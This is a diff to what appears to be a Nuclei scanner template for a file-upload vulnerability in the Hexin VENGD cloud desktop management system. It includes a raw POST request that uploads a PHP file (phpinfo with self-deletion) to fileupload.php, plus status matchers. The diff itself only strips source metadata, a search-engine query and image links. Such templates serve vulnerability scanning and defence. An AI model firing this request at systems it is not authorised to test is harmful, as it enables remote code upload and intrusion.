@@ -3,12 +3,8 @@ info:
   name: 和信下一代云桌面VENGD虚拟化管理系统 fileupload 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yw02wy8f4dimbvyp'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yw02wy8f4dimbvyp
-    fofa: title="和信下一代云桌面VENGD"
 http:
 - raw:
   - 'POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
@@ -37,9 +33,7 @@ http:
 
     <?php phpinfo();unlink(__FILE__);?>
 
-    ------WebKitFormBoundaryfcKRltGv--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685768360-153ad774-9d4b-402c-9a92-0d7f917dee4d.png)'
+    ------WebKitFormBoundaryfcKRltGv--'
   redirects: false
   matchers:
   - status:
@@ -56,7 +50,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685768625-6e4f5ac1-6138-4460-a08a-3475f807ee91.png)'
+    Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6'
   redirects: false
   matchers:
   - status:
